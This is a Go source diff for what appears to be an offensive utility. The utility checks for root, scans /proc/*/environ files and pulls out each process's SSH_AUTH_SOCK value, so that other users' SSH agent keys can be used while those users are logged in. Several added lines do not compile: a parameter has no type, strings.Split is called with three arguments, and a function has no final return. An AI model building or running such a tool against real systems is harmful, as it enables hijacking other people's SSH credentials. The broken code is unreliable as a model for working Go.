@@ -7,6 +7,7 @@ package main
 // key as long as that user is still in the system.
 
 import (
+	"bytes"
 	"fmt"
 	"io/ioutil"
 	"log"
@@ -18,7 +19,11 @@ import (
 	"strings"
 )
 
+// ENVIRON is the environ file within /proc/####/environ
 const ENVIRON string = "environ"
+
+// AUTHSOCK is the variable we are looking for in the environ
+const AUTHSOCK string = "SSH_AUTH_SOCK"
 
 func main() {
 	// first and foremost, let's confirm that we're root.
@@ -36,11 +41,55 @@ func main() {
 	}
 }
 
-func readEnviron(loc string) bool {
+func dumpEnviron(loc) (string, error) {
+	// assuming that the environ variable has the SSH_AUTH_SOCK
+	// there, this will dump the actual socket as a string. This
+	// may be a little bit of a duplication of effort but I wanted
+	// to keep it as simple and modular as possible.
+	var ret string
+	e, err := ioutil.ReadFile(loc)
+	if err != nil {
+		log.Println("Error reading the environment file!")
+		return ret, err
+	}
+	nullByte := []byte{0}
+	envVars := bytes.SplitN(e, nullByte, -1)
+	for _, env := range envVars {
+		line := string(env)
+		res := strings.Split(line, "=", 2)
+		if res[0] == AUTHSOCK {
+			return res[1], err
+		}
+	}
+
+}
+
+func isEnviron(loc string) bool {
 	// this will read the environment file and
 	// return True if the SSH_AUTH_SOCK variable exists
-	
-	e, err := ioutil.ReadAll()
+
+	e, err := ioutil.ReadFile(loc)
+	if err != nil {
+		log.Println("could not read environment file")
+		return false
+	}
+	// split by null byte. This is weird to create because
+	// go just straight up doesn't like defining a byte slice
+	// of just one single null byte. The implicit variable
+	// declaration is the only way I've found to do it and it's
+	// necessary since the environ file is separated by null bytes
+	// ¯\_(ツ)_/¯
+	nullByte := []byte{0}
+	envVars := bytes.SplitN(e, nullByte, -1)
+	for _, env := range envVars {
+		line := string(env)
+		// now split by =
+		res := strings.Split(line, "=", 2)
+		if res[0] == AUTHSOCK {
+			return true
+		}
+	}
+	return false
 }
 
 func areWeRoot() bool {
@@ -86,7 +135,7 @@ func findEnviron(startPath string) ([]string, error) {
 	for _, pid := range pidSlice {
 		// sometimes go is just weird man
 		if _, err := os.Stat(pid + "/" + ENVIRON); !os.IsNotExist(err) {
-			validEnviron = append(validEnviron, pid + "/" + ENVIRON)
+			validEnviron = append(validEnviron, pid+"/"+ENVIRON)
 		}
 	}
 	return validEnviron, err
